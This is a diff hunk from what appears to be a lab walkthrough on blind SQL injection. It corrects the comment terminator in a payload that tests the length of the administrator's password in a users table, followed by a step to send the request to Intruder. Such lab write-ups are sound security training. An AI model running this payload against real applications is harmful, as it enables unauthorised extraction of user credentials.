@@ -76,7 +76,7 @@ else
 - Replace the above payload with the below one.
 
 ```sql
-'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password) > 1)='a'---
+'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password) > 1)='a'--
 ```
 
 - Take the request and send to Intruder.
